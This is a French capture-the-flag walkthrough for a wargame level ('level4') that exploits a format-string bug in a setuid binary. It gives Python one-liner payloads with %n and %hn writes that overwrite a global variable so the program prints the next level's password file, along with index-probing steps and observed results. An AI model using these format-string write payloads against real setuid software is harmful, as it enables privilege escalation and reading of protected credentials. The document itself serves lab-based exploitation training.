# Level4 — Commandes

## Connexion

```bash
ssh level4@localhost -p 4242
```

Mot de passe : (dans `level3/flag`)

---

## Recon

```bash
pwd
ls -la
file level4
readelf -h level4
```

Extraction (depuis l’hôte) :  
`sshpass -p '<level4_password>' scp -o StrictHostKeyChecking=no -P 4242 level4@localhost:level4 ./level4.bin`

Voir `analysis.md`.

---

## Exploitation

Vulnérabilité **format string** : `printf(buffer)`. La variable **m** (0x8049810) doit valoir **0x1025544** (16930116) pour que soit exécuté **system("/bin/cat /home/user/level5/.pass")**.

Si tu as un **segfault** avec tous les payloads, c’est que l’index **k** dans **%k$n** est mauvais : on écrit alors 16930116 sur la stack au lieu de 0x8049810.

### 0. Sur l’ISO officielle : vérifier l’adresse de `m`

L’adresse peut différer d’une extraction locale. Sur la VM :

```bash
objdump -t level4 | grep " m$"
# ou
readelf -s level4 | grep " m "
```

Noter l’adresse (ex. `08049810`). En little endian : si c’est 0x8049810 → `\x10\x98\x04\x08` ; si c’est 0x8049890 → `\x90\x98\x04\x08`, etc.

### 1. Trouver le bon index (obligatoire en cas de segfault)

**Étape A — Dump de la stack**

```bash
python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p"' | ./level4
```

Ce sont des adresses (pas 0x41414141). Le buffer est souvent une des adresses **stack** (0xbffffxxx) : dans ton dump, **%2$p** = 0xbffff794, **%6$p** = 0xbffff758, **%8$p** = 0xbffff550. Si **%1$n** segfault, tester **2**, **6**, **8**.

**Étape B — Vérifier avec une petite écriture (évite le segfault)**

On écrit **64** à `m` au lieu de 16930116. Si l’index est bon, pas de segfault (le programme ne fera juste pas `system` car 64 ≠ 0x1025544). Si l’index est mauvais, segfault.

Teste **chaque** index à la main (remplace **K** par 1, 2, 3, 4, 5, 6, 7, 8) :

```bash
python -c 'print "\x10\x98\x04\x08" + "%60x%K$n"' | ./level4
```

Celui qui **ne** donne **pas** « Segmentation fault » est le bon. Si **%1$n** segfault (comme sur ta VM), essaie **2**, **6**, **8** (adresses stack du dump) :

```bash
python -c 'print "\x10\x98\x04\x08" + "%60x%2$n"' | ./level4
python -c 'print "\x10\x98\x04\x08" + "%60x%6$n"' | ./level4
python -c 'print "\x10\x98\x04\x08" + "%60x%8$n"' | ./level4
```

### 2. Lancer le payload avec cet index

La sortie fait ~16 Mo ; un simple `| tail -1` peut provoquer **Input/output error** (pipe saturé). Il vaut mieux **rediriger vers un fichier**, puis lire la fin :

```bash
# Remplace K par l’index (4 ou 7 en général)
python -c 'print "\x10\x98\x04\x08" + "%16930112x%K$n"' | ./level4 > /tmp/out 2>&1
tail -1 /tmp/out
```

Sur l’ISO officielle, les index **2** et **8** ne segfaultent pas (test avec `%60x%K$n`). Tester le **payload complet** avec **8** puis avec **2** — l’un des deux doit faire exécuter `system("/bin/cat /home/user/level5/.pass")` par le binaire (setuid level5), ce qui affiche le mot de passe. Tu ne peux pas lire le fichier à la main (Permission denied en level4).

```bash
# Avec l’index 8 (attendre 10–30 s, le mot de passe s’affiche à la fin)
python -c 'print "\x10\x98\x04\x08" + "%16930112x%8$n"' | ./level4
```

Si la fin de la sortie n’est pas le mot de passe (64 caractères hex), essayer avec l’index **2**. Si ni 8 ni 2 ne donnent le mot de passe, tenter l’écriture en **deux fois** avec **%hn** (voir ci‑dessous).

---

### Alternative : écriture en 2 fois avec %hn

Si un seul **%n** ne suffit pas, on peut écrire **0x1025544** en deux demi-mots : **0x0102** à l’adresse **0x8049812** et **0x5544** à **0x8049810**. Il faut **deux** arguments qui pointent vers le début du buffer (buffer et buffer+4). D’abord repérer deux indices consécutifs qui ressemblent à des adresses à 4 octets d’écart (buffer, buffer+4) :

```bash
python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p"' | ./level4
```

Si par exemple **%8$p** et **%9$p** donnent deux adresses qui diffèrent de 4 (ex. 0xbffff550 et 0xbffff554), alors buffer = arg8, buffer+4 = arg9. Payload : les deux adresses en tête (0x8049812, 0x8049810), puis écrire 258 (0x0102) avec **%8$hn**, puis 21828−258 = 21570 octets de plus et **%9$hn** (écrit 0x5544 à 0x8049810) :

```bash
python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08" + "%250x%8$hn%21570x%9$hn"' | ./level4
```

(Adapter les indices 8 et 9 si le dump montre buffer / buffer+4 à d’autres positions.)

Si `tail -1 /tmp/out` donne « Input/output error », essayer : `tail -c 100 /tmp/out` ou `cat /tmp/out | tail -1`. Le mot de passe est à la fin du fichier.

Cela peut prendre 10–30 secondes (écriture de ~16 Mo). Le mot de passe level5 est sur la dernière ligne de `/tmp/out`. Si le disque est limité : `rm -f /tmp/out` après.

**Si avec l’index 2 la sortie se termine par "b7ff26b0" et aucun mot de passe :** on n’écrit pas dans `m` (on écrit ailleurs), donc `system()` n’est pas appelé. Il faut que l’écriture aille dans `m` via l’argument qui pointe sur ton buffer (où sont les 4 octets 0x8049810). Essaye avec **uniquement l’argument 1** pour le padding et pour **%n**, pour éviter de toucher à l’argument 2 :

```bash
python -c 'print "\x10\x98\x04\x08" + "%1$16930112x%1$n"' | ./level4
```

(Attendre 10–30 s ; ne pas rediriger vers un fichier pour voir la fin.) Le mot de passe level5 doit apparaître à la toute fin. Si segfault, le binaire ou la VM ne permet peut‑être pas cette exploitation ; documenter l’index 2 et le comportement observé.

### Comportement observé sur cette VM

- **%1$n** (et **%1$16930112x%1$n**) → **Segmentation fault**.
- **%2$n** → pas de segfault, mais la sortie se termine par **"b7ff26b0"** (pas de mot de passe) : l’écriture ne va pas dans `m`, donc `system()` n’est pas appelé.
- **%4$n, %6$n, %7$n, %8$n** → segfault.

**Conclusion :** Si même sur l’ISO officielle tu as un segfault avec **%1$n** : (1) vérifier l’adresse de `m` (étape 0) et l’utiliser en little endian dans le payload ; (2) trouver l’index qui **ne segfault pas** avec la petite écriture (`%60x%K$n` pour K = 1 à 8) ; (3) utiliser **cet** index avec l’adresse trouvée en (1). Si tous les index segfaultent avec la petite écriture, le binaire ou l’environnement peut différer ; documenter dans le walkthrough l’exploit prévu (format string → écriture de 0x1025544 dans `m` → system("/bin/cat ...")).

---

## Récupération du mot de passe level5

Le programme exécute `/bin/cat /home/user/level5/.pass` : le mot de passe est la dernière ligne affichée. Le noter dans `level4/flag`.
